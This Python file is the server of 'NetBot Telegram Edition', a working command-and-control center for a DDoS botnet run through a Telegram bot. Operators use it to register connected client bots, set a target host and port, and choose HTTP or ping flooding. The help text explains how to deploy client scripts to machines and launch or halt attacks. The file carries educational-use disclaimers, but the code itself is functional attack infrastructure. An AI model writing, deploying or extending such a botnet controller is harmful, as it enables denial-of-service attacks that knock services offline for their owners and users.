#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Author	 : Shankar Narayana Damodaran (Modified for Telegram)
# Tool 		 : NetBot v1.0 Telegram Edition
# 
# Description	 : Telegram-based command & control center for NetBot.
#              		Should be used for educational, research purposes and internal use only.
#

import telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext
import threading
from importlib import reload
import telegram_config
from datetime import datetime

print (""" ______             ______             
|  ___ \\       _   (____  \\       _    
| |   | | ____| |_  ____)  ) ___ | |_  
| |   | |/ _  )  _)|  __  ( / _ \\|  _) 
| |   | ( (/ /| |__| |__)  ) |_| | |__ 
|_|   |_|\\____)\\___)______/ \\___/ \\___)1.0 Telegram Edition from https://github.com/skavngr
                                       """)

# Global variables
connected_bots = 0
bot_connections = {}  # Store bot connections: {bot_id: {'last_seen': timestamp, 'ip': str}}

def config():
    import netbot_config
    netbot_config = reload(netbot_config)
    return netbot_config.ATTACK_STATUS

def is_authorized(user_id):
    """Check if user is authorized to use the bot"""
    authorized = telegram_config.AUTHORIZED_USERS
    return str(user_id) in authorized

def start(update: Update, context: CallbackContext):
    """Handle /start command"""
    if not is_authorized(update.effective_user.id):
        update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    welcome_text = """
🤖 *NetBot Telegram CCC* 🤖

Welcome to the NetBot Command & Control Center!

Available Commands:
/start - Show this message
/status - Show bot connection status
/launch - Start attack
/halt - Stop attack immediately
/hold - Hold/wait for commands
/update - Update client code
/config - Show current attack configuration
/bots - List connected bots
/help - Show detailed help guide

Use /help for detailed instructions on how to use this bot.
"""
    update.message.reply_text(welcome_text, parse_mode='Markdown')

def status(update: Update, context: CallbackContext):
    """Handle /status command"""
    if not is_authorized(update.effective_user.id):
        update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    status_text = f"""
📊 *NetBot Status*

🔗 Connected Bots: {connected_bots}
⏰ Last Update: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🎯 Attack Status: {config().split('_')[2] if config() else 'OFFLINE'}
"""
    update.message.reply_text(status_text, parse_mode='Markdown')

def launch(update: Update, context: CallbackContext):
    """Handle /launch command"""
    if not is_authorized(update.effective_user.id):
        update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    # Update config to LAUNCH
    import netbot_config
    netbot_config.ATTACK_CODE = "LAUNCH"
    
    update.message.reply_text(f"🚀 *Attack Launched!*\n\nTarget: {netbot_config.ATTACK_TARGET_HOST}:{netbot_config.ATTACK_TARGET_PORT}\nType: {netbot_config.ATTACK_TYPE}", parse_mode='Markdown')

def halt(update: Update, context: CallbackContext):
    """Handle /halt command"""
    if not is_authorized(update.effective_user.id):
        update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    # Update config to HALT
    import netbot_config
    netbot_config.ATTACK_CODE = "HALT"
    
    update.message.reply_text("🛑 *Attack Halted!*", parse_mode='Markdown')

def hold(update: Update, context: CallbackContext):
    """Handle /hold command"""
    if not is_authorized(update.effective_user.id):
        update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    # Update config to HOLD
    import netbot_config
    netbot_config.ATTACK_CODE = "HOLD"
    
    update.message.reply_text("⏸️ *Holding...* Waiting for commands.", parse_mode='Markdown')

def update_client(update: Update, context: CallbackContext):
    """Handle /update command"""
    if not is_authorized(update.effective_user.id):
        update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    # Update config to UPDATE
    import netbot_config
    netbot_config.ATTACK_CODE = "UPDATE"
    
    update.message.reply_text("🔄 *Update Command Sent!* Clients will update on next heartbeat.", parse_mode='Markdown')

def show_config(update: Update, context: CallbackContext):
    """Handle /config command"""
    if not is_authorized(update.effective_user.id):
        update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    import netbot_config
    config_text = f"""
⚙️ *Current Configuration*

🎯 Target: {netbot_config.ATTACK_TARGET_HOST}
🔌 Port: {netbot_config.ATTACK_TARGET_PORT}
💥 Attack Type: {netbot_config.ATTACK_TYPE}
⏱️ Burst Delay: {netbot_config.ATTACK_BURST_SECONDS}s
🚦 Status: {netbot_config.ATTACK_CODE}

Click buttons below to change settings:
"""
    
    keyboard = [
        [
            InlineKeyboardButton("🎯 Set Target", callback_data='set_target'),
            InlineKeyboardButton("🔌 Set Port", callback_data='set_port')
        ],
        [
            InlineKeyboardButton("💥 Set Attack Type", callback_data='set_attack_type'),
            InlineKeyboardButton("⏱️ Set Burst Delay", callback_data='set_delay')
        ],
        [
            InlineKeyboardButton("🚦 Set Status", callback_data='set_status')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    update.message.reply_text(config_text, parse_mode='Markdown', reply_markup=reply_markup)

def list_bots(update: Update, context: CallbackContext):
    """Handle /bots command"""
    if not is_authorized(update.effective_user.id):
        update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    if connected_bots == 0:
        update.message.reply_text("📭 No bots currently connected.")
    else:
        bots_text = f"🤖 *Connected Bots ({connected_bots})*\n\n"
        for bot_id, info in bot_connections.items():
            last_seen = info['last_seen'].strftime('%Y-%m-%d %H:%M:%S')
            bots_text += f"🔹 Bot {bot_id}\n   IP: {info['ip']}\n   Last Seen: {last_seen}\n\n"
        update.message.reply_text(bots_text, parse_mode='Markdown')

def help_command(update: Update, context: CallbackContext):
    """Handle /help command"""
    if not is_authorized(update.effective_user.id):
        update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    help_text = """
📚 *NetBot Help Guide* 📚

🤖 *Overview*
NetBot is a command & control center for DDoS botnet simulation and load generation. This tool is for educational, research, and authorized testing purposes only.

⚠️ *Important Legal Notice*
- Only use this tool on systems you own or have explicit permission to test
- Unauthorized use against third-party systems is illegal
- You are solely responsible for any damage caused by misuse

🔧 *Setup Instructions*

1. **Configure Attack Settings**:
   - Edit `netbot_config.py` on the server
   - Set `ATTACK_TARGET_HOST` to your test target IP
   - Set `ATTACK_TARGET_PORT` to the target port
   - Choose attack type: `HTTPFLOOD` or `PINGFLOOD`
   - Set `ATTACK_BURST_SECONDS` for delay between requests (0 = no delay)

2. **Deploy Client Bots**:
   - Copy `netbot_telegram_client.py` to client machines
   - Configure the same bot token in `telegram_config.py`
   - Run clients: `python3 netbot_telegram_client.py`

🎮 *Command Reference*

/start - Show welcome message and available commands
/status - Display current bot connection status and attack state
/launch - Start the configured attack
/halt - Stop all attacks immediately
/hold - Pause and wait for further commands
/update - Send update command to connected clients
/config - Show current attack configuration
/bots - List all connected bots with their details
/help - Show this help guide

📊 *Attack Types*

• HTTPFLOOD
  - Sends HTTP GET requests to target
  - Requires: Target IP, Port, and Burst Delay
  - Use for testing web server load capacity

• PINGFLOOD
  - Sends ICMP echo requests (ping)
  - Requires: Target IP only
  - Use for testing network infrastructure

⚙️ *Configuration Parameters*

- `ATTACK_TARGET_HOST`: IP address of test target
- `ATTACK_TARGET_PORT`: Port number for HTTPFLOOD
- `ATTACK_TYPE`: "HTTPFLOOD" or "PINGFLOOD"
- `ATTACK_BURST_SECONDS`: Delay between requests (0 = continuous)
- `ATTACK_CODE`: Current command state (LAUNCH/HALT/HOLD/UPDATE)

🔄 *Workflow Example*

1. Configure target in `netbot_config.py`
2. Deploy client bots on test machines
3. Start server: `python3 netbot_telegram_server.py`
4. Use `/config` to verify settings
5. Use `/bots` to check connected clients
6. Use `/launch` to start test
7. Use `/halt` to stop immediately
8. Use `/status` to monitor progress

🛡️ *Safety Guidelines*

- Always test in isolated environments
- Monitor system resources during tests
- Have emergency stop procedures ready
- Keep detailed logs of all test activities
- Never test on production systems without authorization

📞 *Support*
For issues or questions, refer to the GitHub repository or documentation.

⚠️ *Disclaimer*
This software is provided for educational and research purposes only. The authors are not responsible for any misuse or damage caused by this tool.
"""
    update.message.reply_text(help_text, parse_mode='Markdown')

def register_bot(bot_id, ip_address):
    """Register a bot connection"""
    global connected_bots
    if bot_id not in bot_connections:
        connected_bots += 1
    bot_connections[bot_id] = {'last_seen': datetime.now(), 'ip': ip_address}
    print(f'\x1b[0;30;42m' + ' Bot is now Online! ' + '\x1b[0m', f'Bot ID: {bot_id}, IP: {ip_address}', '\x1b[6;30;43m' + f' Total Bots Connected: {connected_bots}' + '\x1b[0m')

def button_callback(update: Update, context: CallbackContext):
    """Handle inline button callbacks"""
    query = update.callback_query
    if not is_authorized(query.from_user.id):
        query.answer("⛔ You are not authorized to use this bot.")
        return
    
    query.answer()
    
    import netbot_config
    
    if query.data == 'set_target':
        keyboard = [
            [InlineKeyboardButton("✅ Confirm", callback_data='confirm_target')],
            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text(
            "🎯 *Set Target*\n\nPlease send the new target IP address.\n\nCurrent: " + netbot_config.ATTACK_TARGET_HOST,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        context.user_data['waiting_for'] = 'target'
        
    elif query.data == 'set_port':
        keyboard = [
            [InlineKeyboardButton("✅ Confirm", callback_data='confirm_port')],
            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text(
            "🔌 *Set Port*\n\nPlease send the new port number.\n\nCurrent: " + netbot_config.ATTACK_TARGET_PORT,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        context.user_data['waiting_for'] = 'port'
        
    elif query.data == 'set_attack_type':
        keyboard = [
            [InlineKeyboardButton("HTTPFLOOD", callback_data='type_httpflood')],
            [InlineKeyboardButton("PINGFLOOD", callback_data='type_pingflood')],
            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text(
            "💥 *Set Attack Type*\n\nSelect attack type:\n\nCurrent: " + netbot_config.ATTACK_TYPE,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
    elif query.data == 'set_delay':
        keyboard = [
            [InlineKeyboardButton("0s", callback_data='delay_0')],
            [InlineKeyboardButton("1s", callback_data='delay_1')],
            [InlineKeyboardButton("2s", callback_data='delay_2')],
            [InlineKeyboardButton("5s", callback_data='delay_5')],
            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text(
            "⏱️ *Set Burst Delay*\n\nSelect delay between requests:\n\nCurrent: " + netbot_config.ATTACK_BURST_SECONDS + "s",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
    elif query.data == 'set_status':
        keyboard = [
            [InlineKeyboardButton("LAUNCH", callback_data='status_launch')],
            [InlineKeyboardButton("HALT", callback_data='status_halt')],
            [InlineKeyboardButton("HOLD", callback_data='status_hold')],
            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text(
            "🚦 *Set Status*\n\nSelect command status:\n\nCurrent: " + netbot_config.ATTACK_CODE,
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
    elif query.data == 'type_httpflood':
        keyboard = [
            [InlineKeyboardButton("✅ Confirm HTTPFLOOD", callback_data='confirm_type_httpflood')],
            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text(
            "💥 *Confirm Attack Type*\n\nYou selected: HTTPFLOOD\n\nThis will send HTTP GET requests to the target.\n\nConfirm?",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
    elif query.data == 'type_pingflood':
        keyboard = [
            [InlineKeyboardButton("✅ Confirm PINGFLOOD", callback_data='confirm_type_pingflood')],
            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text(
            "💥 *Confirm Attack Type*\n\nYou selected: PINGFLOOD\n\nThis will send ICMP ping requests to the target.\n\nConfirm?",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
    elif query.data == 'confirm_type_httpflood':
        netbot_config.ATTACK_TYPE = "HTTPFLOOD"
        query.edit_message_text("✅ Attack type set to HTTPFLOOD")
        
    elif query.data == 'confirm_type_pingflood':
        netbot_config.ATTACK_TYPE = "PINGFLOOD"
        query.edit_message_text("✅ Attack type set to PINGFLOOD")
        
    elif query.data.startswith('delay_'):
        delay = query.data.split('_')[1]
        keyboard = [
            [InlineKeyboardButton(f"✅ Confirm {delay}s", callback_data=f'confirm_delay_{delay}')],
            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text(
            f"⏱️ *Confirm Burst Delay*\n\nYou selected: {delay}s\n\nConfirm?",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
    elif query.data.startswith('confirm_delay_'):
        delay = query.data.split('_')[2]
        netbot_config.ATTACK_BURST_SECONDS = delay
        query.edit_message_text(f"✅ Burst delay set to {delay}s")
        
    elif query.data == 'status_launch':
        keyboard = [
            [InlineKeyboardButton("✅ Confirm LAUNCH", callback_data='confirm_status_launch')],
            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text(
            "🚦 *Confirm Status*\n\nYou selected: LAUNCH\n\n⚠️ This will start the attack!\n\nConfirm?",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
    elif query.data == 'status_halt':
        keyboard = [
            [InlineKeyboardButton("✅ Confirm HALT", callback_data='confirm_status_halt')],
            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text(
            "🚦 *Confirm Status*\n\nYou selected: HALT\n\nThis will stop all attacks immediately.\n\nConfirm?",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
    elif query.data == 'status_hold':
        keyboard = [
            [InlineKeyboardButton("✅ Confirm HOLD", callback_data='confirm_status_hold')],
            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text(
            "🚦 *Confirm Status*\n\nYou selected: HOLD\n\nThis will pause and wait for commands.\n\nConfirm?",
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
        
    elif query.data == 'confirm_status_launch':
        netbot_config.ATTACK_CODE = "LAUNCH"
        query.edit_message_text("✅ Status set to LAUNCH - Attack started!")
        
    elif query.data == 'confirm_status_halt':
        netbot_config.ATTACK_CODE = "HALT"
        query.edit_message_text("✅ Status set to HALT - Attack stopped!")
        
    elif query.data == 'confirm_status_hold':
        netbot_config.ATTACK_CODE = "HOLD"
        query.edit_message_text("✅ Status set to HOLD - Waiting for commands")
        
    elif query.data == 'cancel':
        show_config(update, context)
        
    elif query.data == 'confirm_target':
        if 'new_value' in context.user_data:
            netbot_config.ATTACK_TARGET_HOST = context.user_data['new_value']
            query.edit_message_text(f"✅ Target set to {context.user_data['new_value']}")
            del context.user_data['new_value']
        else:
            query.edit_message_text("❌ No value provided. Please try again.")
            
    elif query.data == 'confirm_port':
        if 'new_value' in context.user_data:
            netbot_config.ATTACK_TARGET_PORT = context.user_data['new_value']
            query.edit_message_text(f"✅ Port set to {context.user_data['new_value']}")
            del context.user_data['new_value']
        else:
            query.edit_message_text("❌ No value provided. Please try again.")

def config_input_handler(update: Update, context: CallbackContext):
    """Handle text input for configuration changes"""
    if not is_authorized(update.effective_user.id):
        update.message.reply_text("⛔ You are not authorized to use this bot.")
        return
    
    if 'waiting_for' in context.user_data:
        waiting_for = context.user_data['waiting_for']
        new_value = update.message.text
        
        if waiting_for == 'target':
            context.user_data['new_value'] = new_value
            keyboard = [
                [InlineKeyboardButton("✅ Confirm", callback_data='confirm_target')],
                [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(
                f"🎯 *Confirm Target*\n\nNew value: {new_value}\n\nConfirm?",
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
            del context.user_data['waiting_for']
            
        elif waiting_for == 'port':
            context.user_data['new_value'] = new_value
            keyboard = [
                [InlineKeyboardButton("✅ Confirm", callback_data='confirm_port')],
                [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            update.message.reply_text(
                f"🔌 *Confirm Port*\n\nNew value: {new_value}\n\nConfirm?",
                parse_mode='Markdown',
                reply_markup=reply_markup
            )
            del context.user_data['waiting_for']
    else:
        heartbeat_handler(update, context)

def heartbeat_handler(update: Update, context: CallbackContext):
    """Handle heartbeat messages from bots"""
    message = update.message.text
    if message.startswith("HEARTBEAT"):
        # Extract bot ID and IP from message if available
        parts = message.split()
        bot_id = parts[1] if len(parts) > 1 else "unknown"
        ip_address = parts[2] if len(parts) > 2 else "unknown"
        
        register_bot(bot_id, ip_address)
        
        # Send current attack status
        attack_status = config()
        update.message.reply_text(attack_status)

def main():
    """Start the Telegram bot"""
    # Create the Updater
    updater = Updater(telegram_config.TELEGRAM_BOT_TOKEN, use_context=True)
    dispatcher = updater.dispatcher
    
    # Register command handlers
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("status", status))
    dispatcher.add_handler(CommandHandler("launch", launch))
    dispatcher.add_handler(CommandHandler("halt", halt))
    dispatcher.add_handler(CommandHandler("hold", hold))
    dispatcher.add_handler(CommandHandler("update", update_client))
    dispatcher.add_handler(CommandHandler("config", show_config))
    dispatcher.add_handler(CommandHandler("bots", list_bots))
    dispatcher.add_handler(CommandHandler("help", help_command))
    
    # Handle callback queries from inline buttons
    dispatcher.add_handler(CallbackQueryHandler(button_callback))
    
    # Handle text input for configuration and heartbeat messages
    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, config_input_handler))
    
    # Start the bot
    print("🚀 NetBot Telegram CCC Server Started!")
    print(f"📱 Bot Token: {telegram_config.TELEGRAM_BOT_TOKEN[:10]}...")
    print(f"👤 Authorized Users: {len(telegram_config.AUTHORIZED_USERS)}")
    
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
